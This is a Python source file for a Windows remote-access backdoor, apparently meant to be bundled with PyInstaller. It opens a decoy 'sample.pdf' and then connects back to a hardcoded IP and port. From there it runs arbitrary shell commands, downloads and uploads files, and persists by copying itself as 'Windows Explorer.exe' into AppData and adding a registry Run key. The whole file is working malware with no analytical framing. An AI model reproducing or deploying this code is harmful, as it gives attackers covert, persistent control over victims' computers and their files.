#!/usr/bin/python

import socket
import subprocess
import json
import os
import base64
import sys
import shutil

class Backdoor:

    def __init__(self, ip, port):
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def become_persistent(self):
        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call(
                'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v name /t REG_SZ /d "' 
                + evil_file_location + '"', 
                shell=True
            )

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data.decode())
            except ValueError:
                continue

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True).decode()

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changed working directory to " + path

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
        return "[+] Upload successful"

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()

    def run(self):
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)
            except Exception as e:
                command_result = f"[-] Error during command execution: {str(e)}"
            self.reliable_send(command_result)


# Running file along with the backdoor initialization
if __name__ == "__main__":
    try:
        # Handling bundled files using _MEIPASS with PyInstaller
        if hasattr(sys, '_MEIPASS'):
            file_name = os.path.join(sys._MEIPASS, "sample.pdf")
        else:
            file_name = "sample.pdf"  # Fallback to local directory

        # Attempt to open the file safely
        try:
            subprocess.Popen(file_name, shell=True)
        except Exception as e:
            print(f"Error opening file: {e}")

        # Starting the backdoor connection
        my_backdoor = Backdoor("192.168.206.94", 1234)
        my_backdoor.run()
        
    except Exception as e:
        print(f"Error: {e}")
        sys.exit()
